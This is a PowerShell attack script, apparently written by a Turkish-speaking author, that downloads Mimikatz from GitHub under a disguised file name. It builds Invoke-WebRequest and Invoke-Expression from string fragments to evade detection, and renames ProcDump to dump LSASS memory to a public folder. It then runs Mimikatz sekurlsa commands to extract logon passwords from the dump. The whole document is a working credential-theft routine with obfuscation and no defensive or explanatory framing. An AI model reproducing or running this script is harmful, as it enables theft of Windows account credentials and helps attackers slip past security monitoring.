# Step 1: Define obfuscated string for downloading Mimikatz and renaming it immediately after download
$downloadYilmaz = "https://github.com/ParrotSec/mimikatz/raw/refs/heads/master/x64/mimikatz.exe"
$renamedYilmaz = "sifreliokuma64.exe"  # New name after download
$downloadPath = "./$renamedYilmaz"

# Step 2: Obfuscate the Invoke-WebRequest command
$indirici = "Invo"
$indirici2 = "ke-"
$onur1 = "Web"
$onur2 = "Request"
$ben = $indirici + $indirici2 + $onur1 + $onur2  


& $ben -Uri $downloadYilmaz -OutFile $downloadPath
Write-Output "Downloaded and saved as $renamedYilmaz"


$atilla = "Invo"
$mesut = "ke-Ex"
$doga = "pression"
$sifrelitaktak = $atilla + $mesut + $doga  


$procDump = "pro" + "cdump64"
$filePath = "./" + $procDump + ".exe"  


$yeniYilmaz = "yilmazdegirmenci.exe"
Rename-Item -Path $filePath -NewName $yeniYilmaz  
$renamedFilePath = "./" + $yeniYilmaz

# Step 6: Define the dump path and get the LSASS process ID
$sizinti = "C:\Users\Public\lsass.dmp"
$processId = (Get-Process "lsass").Id
Write-Output ("Found LSASS process. PID: " + $processId)

# Step 7: Execute the renamed ProcDump to create the .dmp file
$burak = "Start-Process -FilePath `"$renamedFilePath`" -ArgumentList `"-ma $processId $sizinti`" -NoNewWindow -Wait"
& $sifrelitaktak $burak  # Executes the obfuscated command to dump LSASS

# Confirmation message
Write-Output "Process memory dump completed and saved to $sizinti"

# Step 8: Define obfuscated Mimikatz command to analyze the dump
$suleyman = "sifreli"
$onurcan = "okuma"
$ozge = "64.exe"
$sifreliokuma = $suleyman + $onurcan + $ozge  
$sifreliokumaYol = "./$sifreliokuma"  


$sifreliYol = "`"$sifreliokumaYol`""  
$miniokuyucuKomut = "sekurlsa::minidump"
$sifrelerinKomutu = "sekurlsa::logonpasswords"


$sistemyolPath = $sizinti  

# Construct each part of the command
$SifreliMinidump = "`"$miniokuyucuKomut`" `$sistemyolPath"  
$Sifreicerikleri = "`"$sifrelerinKomutu`""  

# Combine them into the final command
$FullKomut = "$sifreliYol $SifreliMinidump; $Sifreicerikleri"


& $sifrelitaktak $FullKomut

# Output confirmation
Write-Output "Sifreliokuma execution completed on $sizinti"
